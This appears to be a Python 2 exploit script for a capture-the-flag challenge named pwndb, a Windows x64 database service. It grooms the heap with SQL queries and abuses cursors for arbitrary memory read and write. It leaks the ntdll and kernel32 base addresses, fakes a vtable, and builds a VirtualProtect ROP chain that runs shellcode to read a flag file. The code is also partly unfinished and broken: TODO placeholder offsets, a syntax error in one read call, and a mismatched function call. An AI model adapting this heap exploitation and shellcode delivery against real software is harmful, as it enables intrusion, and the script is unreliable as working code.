import subprocess, time, string, itertools, struct, random, ast, sys, tempfile, os, socket, traceback
from subprocess import Popen, PIPE
from wintools import hash_both, nasm, api_call_stub
from pwnlib.tools import x86_64, connect, send, ru, sendln, get_socket
#from pow import solve_proof_of_work

LOGGING = False
BINARY = 'Z:/34c3ctf/pwndb/db/x64/Release/pwndb.exe'
#FLAG_FILE = r'C:\Users\niklasb\flag.txt'
FLAG_FILE = r'C:\flag.txt'

def randstr(n):
	return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

def quote(s):
	return '"%s"' % ''.join('\\x%02x' % ord(c) for c in s)

sc = r'''BITS 64

and rsp, ~0xf
sub rsp, 0x1000
mov rbp, rsp
sub rsp, 0x100

lea rcx, [rel flag_file]
mov rdx, rbp
mov r8, 0

mov r10, {hash_OpenFile}
;int3
call api_call
;int3
mov [rbp], rax

;ReadFile(h, &buf, len, &tx, NULL)
mov rcx, rax
lea rdx, [rbp+16]
mov r8, 100
lea r9, [rbp+8]
push 0

mov r10, {hash_ReadFile}
;int3
call api_call
;int3

mov ebx, [rbp+8]
lea rax, [rbp+16+rbx]
mov byte [rax], ';'
mov byte [rax+1], 10
mov byte [rax+2], 0
add rbx, 3
mov [rbp+8], rbx

mov ecx, -11
mov r10, {hash_GetStdHandle}
;int3
call api_call
;int3

mov rcx, rax
lea rdx, [rbp+16]
mov r8, [rbp+8]
lea r9, [rbp+0x100]
push 0
mov r10, {hash_WriteFile}
;int3
call api_call
;int3

foo:
	jmp foo

flag_file:
  db "{FLAG_FILE}", 0
'''.format(
	hash_OpenFile=hash_both('kernel32', 'OpenFile'),
	hash_ReadFile=hash_both('kernel32', 'ReadFile'),
	hash_GetStdHandle=hash_both('kernel32', 'GetStdHandle'),
	hash_WriteFile=hash_both('kernel32', 'WriteFile'),
	FLAG_FILE=FLAG_FILE,
	)

sc += api_call_stub

sc = x86_64.assemble(sc)
#sc = nasm(sc)
#sc = '\xcc'*10
print '[*] Shellcode size = %d' % len(sc)

class Pattern:
    def __init__(self, n):
        alph = string.ascii_uppercase + string.ascii_lowercase + string.digits
        if n <= len(alph):
            self.s = alph[:n]
            return
        if n <= len(alph)**2:
            self.s = "".join(alph[i] for i in de_bruijn(len(alph), 2))[:n]
            return
        s = ""
        for a,b,c in itertools.product(
                string.ascii_uppercase,
                string.ascii_lowercase,
                string.digits):
            s += a + b + c
            if len(s) >= n:
                break
        assert len(s) >= n
        self.s = s[:n]
    def __str__(self):
        return self.s
    def offset(self, x):
        p = struct.pack('<Q',x)
        i = self.s.index(p)
        try:
            self.s[i+len(p):].index(p)
        except ValueError:
            return i
        else:
            raise ValueError, "Not unique!"

def pwn(query, multiquery):
	assert 'ok' in query('create table bar(a)')

	def select(qry):
		res = query(qry)
		assert 'ok' in res
		return int(res.split()[1])

	queries = []
	for sz in range(0, 1000, 8):
		for j in range(10):
			x = 'a'*(sz-1)
			queries.append('insert into bar(a) values("%s")'%x)
	for x in multiquery(queries):
		assert 'success' in x

	if LOGGING:
		assert 'ok' in query('startlog')
	assert 'ok' in query('create table c(a)')

	tables = {}
	table_counter = [0]
	def spray_table():
		table_counter[0] += 1
		tabname = randstr(14)
		tables[table_counter[0]] = tabname
		return [
			'create table %s(a)'%tabname,
			'insert into %s (a) values ("%s%d")' % (tabname, 'a'*4, table_counter[0])
		]

	queries = []
	for _ in range(200):
		queries += spray_table()
	for x in multiquery(queries):
		assert 'success' in x

	for _ in range(2):
		assert 'ok' in query('insert into c (a) values("1")')

	cursor1 = select('select * from c where a="1"')

	assert 'ok' in query('insert into c (a) values("1")')

	for _ in range(100):
		spray_table()

	if LOGGING:
		assert 'ok' in query('stoplog')

	def row_index_pattern(n):
		x = 'b'*8 + 'c'*8 + 'd'*8 + 'e'*8 + struct.pack('<Q', 11)
		x += 'a'*(n-1-len(x))
		return x

	queries = []
	for i in range(1000):
		x = row_index_pattern(80)
		queries.append('insert into bar(a) values(%s)'%quote(x))
	res = multiquery(queries)
	for r in res:
		assert 'success' in r

	if LOGGING:
		addrs = set()
		with open("C:/Users/niklas/test.txt") as f:
			for line in f:
				if line.startswith('table allocated at'):
					addr = int(line.split()[3],16)
					addrs.add(addr)
				elif line.startswith('new capacity=3'):
					addr2 = int(line.split()[3], 16)

		good = set()
		for i in range(-100, 100):
			a = addr2 + i*24 - 24
			if a in addrs:
				good.add(i)

		print 'good=', good
		if 11 not in good:
			print 'WILL NOT WORK'
			return False

		print 'addr2 = ', hex(addr2)
		assert addr2 + 11*24 - 24 in addrs
		print 'table @ ', hex(addr2 + 11*24 - 24)

	try:
		res = query('get cursor %d' % cursor1)
	except AssertionError:
		print '[!] Remote crashed, retrying'
		return False

	res = ast.literal_eval(res[3:])

	tabid = int(res[4:].split('\0')[0])
	tabname = tables[tabid]

	cursor2 = select('select * from %s' % tabname)
	assert 'ok' in query('get cursor %d' % cursor2)
	assert 'ok' in query('update cursor %d set a=%s' % (cursor2, quote(row_index_pattern(100))))

	try:
		res = query('get cursor %d' % cursor1)
	except AssertionError:
		print '[!] Remote crashed'
		return False

	res = ast.literal_eval(res[3:])
	ptrs = struct.unpack('<QQQQ', res[:4*8])
	heap_ptr = ptrs[0]
	print '[*] heapptr @ %016x' % heap_ptr

	def set_addr(addr, n):
		n = max(n, 32)
		assert 'ok' in query('update cursor %d set a=%s' % (cursor1, quote(struct.pack('<QQQQ', addr, 0, n, n))))

	def read(addr, n=8):
		set_addr(addr, n)
		res = query('get cursor %d' % cursor2)
		assert 'ok' in res
		res = ast.literal_eval(res[3:])
		assert len(res) >= n
		return res[:n]

	def write(addr, value, ignore_result=False):
		set_addr(addr, len(value))
		res = query('update cursor %d set a=%s' % (cursor2, quote(value)))
		if not ignore_result:
			assert 'ok' in res
		return res

	assert 'ok' in query('create table leet (a)')
	rows = '("a"), '*1336 + '("a")'
	q = 'insert into leet (a) values %s'%rows
	assert 'ok' in query(q)

	if LOGGING:
		assert 'ok' in query('startlog')
	cursors = []
	for i in range(20):
		c = select('select * from leet')
		cursors.append(c)
		res = multiquery(['advance cursor %d'%c for j in range(i)])
		for x in res:
			assert 'ok' in x
	if LOGGING:
		assert 'ok' in query('stoplog')

	assert 'ok' in query('update cursor %d set a=%s' % (cursor1, quote('x'*16 + struct.pack('<QQ', 0xf, 0xf))))
	assert 'ok' in query('update cursor %d set a=%s' % (cursor2, quote('y'*31)))
	res = query('get cursor %d' % cursor1)
	res = ast.literal_eval(res[3:])
	ptrs = struct.unpack('<QQQQ', res[:4*8])
	heap_ptr2 = ptrs[0]
	print '[*] heapptr2 @ %016x' % heap_ptr2

	magic = struct.pack('<Q', 1337)
	cursor_addresses = []
	heap_chunks = {}

	print '[*] Scanning heap...'
	for i in range(-100,1):
		#if i % 20 == 0: print '    Progress (step1):', i
		addr = heap_ptr2 + 1000*i
		dat = read(addr, 1000)
		heap_chunks[addr] = dat

		offset = 0
		while True:
			nxt = dat.find(magic, offset)
			if nxt < 0:
				break
			cursor_addr = addr + nxt - 24
			cursor_addresses.append(cursor_addr)
			offset = nxt+1

	for i in range(-50,300):
		#if i % 20 == 0: print '    Progress (step2):', i
		addr = heap_ptr + 1000*i
		dat = read(addr, 1000)
		heap_chunks[addr] = dat

	if not cursor_addresses:
		print "[!] Did not find cursor!"
		return False

	print '[*] Cursors found: %d' % len(cursor_addresses)

	cursor_addr = None
	pointer_addr = None
	for caddr in cursor_addresses:
		ptr = struct.pack('<Q', caddr)
		for addr, chunk in heap_chunks.items():
			assert len(chunk) == 1000
			if ptr in chunk:
				pointer_addr = addr+chunk.index(ptr)
				cursor_addr = caddr
				break

	if cursor_addr is None:
		print '[!] Did not find pointer to cursor'
		return False

	print '[*] Cursor @ %016x' % cursor_addr
	print '[*] Pointer to cursor @ %016x' % pointer_addr
	vtab, _, mcur = struct.unpack('<QQQ', read(cursor_addr,24))
	print '[*] Vtable @ %016x' % vtab

	AllCursorValid = struct.unpack('<Q', read(vtab+8))[0]
	#print '[*] AllCursorValid @ 0x%016x' % AllCursorValid
	binbase = AllCursorValid - 0x3b40
	print '[*] Binary @ 0x%016x' % binbase

	ntdll = struct.unpack('<Q', read(binbase + 0x43010))[0] - 0x8fbe0
	kernel32 = struct.unpack('<Q', read(binbase + 0x3e000))[0] - 0x21890
	print '[*] ntdll @ 0x%016x' % ntdll
	print '[*] kernel32 @ 0x%016x' % kernel32

	target_cursor = cursors[mcur]

	assert 'ok' in query('update cursor %d set a=%s' % (cursor1, quote('x'*16 + struct.pack('<QQ', 0xf, 0xf))))
	assert 'ok' in query('update cursor %d set a=%s' % (cursor2, quote('y'*0x500)))
	res = query('get cursor %d' % cursor1)
	res = ast.literal_eval(res[3:])
	ptrs = struct.unpack('<QQQQ', res[:4*8])
	heap_ptr3 = ptrs[0]
	print '[*] heapptr3 @ %016x' % heap_ptr3

	pop = ntdll + 0x8fb0f  # rdx, rcx, r8, r9, r10, r11
	VirtualProtect = kernel32 + 0x1b0b0
	RtlCaptureContext = ntdll + 0x00000 # TODO
	context_offset_rsp = 0x0000         # TODO

	fake = ''
	fake += struct.pack('<Q', heap_ptr3 + 0x80)
	fake += struct.pack('<Q', 0)
	fake += struct.pack('<Q', 0)
	fake += struct.pack('<Q', 1)

	fake += 'a'*(0x80-len(fake))
	fake += struct.pack('<Q', 0)
	fake += struct.pack('<Q', AllCursorValid) # valid()
	fake += struct.pack('<Q', RtlCaptureContext) # next()

	fake += 'b'*(0x100-len(fake))
	fake += struct.pack('<Q', 0)
	fake += struct.pack('<Q', 0x1000)

	fake += 'c'*(0x200-len(fake))
	fake += sc

	sc_loc = heap_ptr3 + 0x200

	#raw_input('1')
	write(heap_ptr3, fake)
	write(pointer_addr, struct.pack('<Q', heap_ptr3))
	#raw_input('2')
	assert 'ok' in query('advance cursor %d' % target_cursor)
	#raw_input('3')

	stack = struct.unpack('<Q', read(heap_ptr3 + ))[0]
	print '[*] Stack leak @ %016x' % stack
	#raw_input('4')

	# figured out by putting breakpoint on return of pwndb::SqlTable::update
	ret = stack - 0xf48672fbf0 + 0xf48672fb68
	print '[*] writing to %016x' % ret

	rwx_start = sc_loc & ~0xfff
	rwx_len = 0x1000
	if ((sc_loc + len(sc) - 1) & ~0xfff) != rwx_start:
		rwx_len += 0x1000

	rop = ''
	rop += struct.pack('<Q', pop)
	rop += struct.pack('<Q', rwx_len)         # rdx
	rop += struct.pack('<Q', rwx_start)       # rcx
	rop += struct.pack('<Q', 0x40)            # r8
	rop += struct.pack('<Q', heap_ptr2)       # r9
	rop += 'A'*0x10                           # r10, r11
	rop += struct.pack('<Q', VirtualProtect)
	rop += struct.pack('<Q', sc_loc)

	# raw_input('wait')
	print '[*] Flag = %s' % repr(write(ret, rop, ignore_result=True))

	print '[*] Done, press ENTER to exit'
	#raw_input()
	return True

if len(sys.argv) > 2:
	host = sys.argv[1]
	port = int(sys.argv[2])
	while True:
		print "[*] Connecting to %s:%d" % (host, port)
		# sock = socket.create_connection((host, port))
		connect(host=host, port=port)
		get_socket().settimeout(2)

		if '--pow' in sys.argv:
			ru('challenge: ')
			chall=ru('\n').strip()
			print 'Solving PoW...'
			sendln(solve_proof_of_work(chall))
			print 'Done.'
			ru('over.\n')
			time.sleep(1)

		# def ru(st):
			# buf=''
			# while not st in buf:
				# c = sock.recv(1)
				# assert c
				# buf += c
			# return buf

		num = [0, 1]
		def query(s):
			num[0] +=1
			num[1] +=len(s)
			if num[0]%100==0:
				print 'queries: %d / bytes: %d'%tuple(num)
			#sock.sendall(s + ';\n')
			sendln(s +';')
			return ru('\n').rsplit(';',1)[0]

		def multiquery(queries):
			#num[0] +=sum(1 for s in queries)
			#num[1] +=sum(len(s) for s in queries)
			for s in queries:
				sendln(s +';')
			res = []
			for _ in queries:
				res.append( ru('\n').rsplit(';',1)[0])
			return res

		try:
			if pwn(query, multiquery):
				break
		except KeyboardInterrupt:
			break
		except:
			traceback.print_exc()
			pass

		# try:
			# sock.close()
		# except KeyboardInterrupt:
			# break
else:
	while True:
		print "[*] Running locally"
		p = Popen(BINARY, stdin=PIPE, stdout=PIPE)

		def ru(st):
			buf=''
			while not st in buf:
				c = p.stdout.read(1)
				assert c
				buf += c
			return buf

		def query(s):
			p.stdin.write(s + ';\n')
			return ru('\n').rsplit(';',1)[0]

		if pwn(query):
			break
		p.terminate()
